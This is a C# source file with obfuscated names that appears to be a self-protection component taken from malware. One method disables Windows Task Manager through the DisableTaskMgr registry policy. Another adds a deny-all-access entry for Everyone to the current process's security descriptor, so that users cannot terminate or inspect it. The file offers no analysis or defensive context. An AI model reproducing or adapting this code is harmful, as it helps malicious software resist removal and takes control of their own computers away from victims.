using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace OedchgEuvSrX;

internal class qfjQGFANnktF
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr nxFWUyYVfSfc, int arYsKnkIiujL, [Out] byte[] eWMyHunCeItJ, uint uhBOAncCpEVx, out uint gsxfcjJCWbpCyc);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr SCxApqnsIiQICE, int wBHdXFDWyVN, [In] byte[] lMlagloUgUlPd);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void TlDNPWybLtwX(bool ZnxdFITIhLzsny)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (ZnxdFITIhLzsny && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor dtKQyOeFFEGQ(IntPtr qQJZlxtivGPCPUrQ)
	{
		byte[] eWMyHunCeItJ = new byte[0];
		GetKernelObjectSecurity(qQJZlxtivGPCPUrQ, 4, eWMyHunCeItJ, 0u, out var gsxfcjJCWbpCyc);
		if ((long)gsxfcjJCWbpCyc > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(qQJZlxtivGPCPUrQ, 4, eWMyHunCeItJ = new byte[gsxfcjJCWbpCyc], gsxfcjJCWbpCyc, out gsxfcjJCWbpCyc))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(eWMyHunCeItJ, 0);
	}

	private void NdEHWJgWhWLAe(IntPtr ZAqQCuCzYye, RawSecurityDescriptor FMpuNpmavRQ)
	{
		byte[] array = new byte[FMpuNpmavRQ.BinaryLength];
		FMpuNpmavRQ.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(ZAqQCuCzYye, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void YnyVeiwoPxRekhO()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = dtKQyOeFFEGQ(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		NdEHWJgWhWLAe(currentProcess, rawSecurityDescriptor);
	}
}
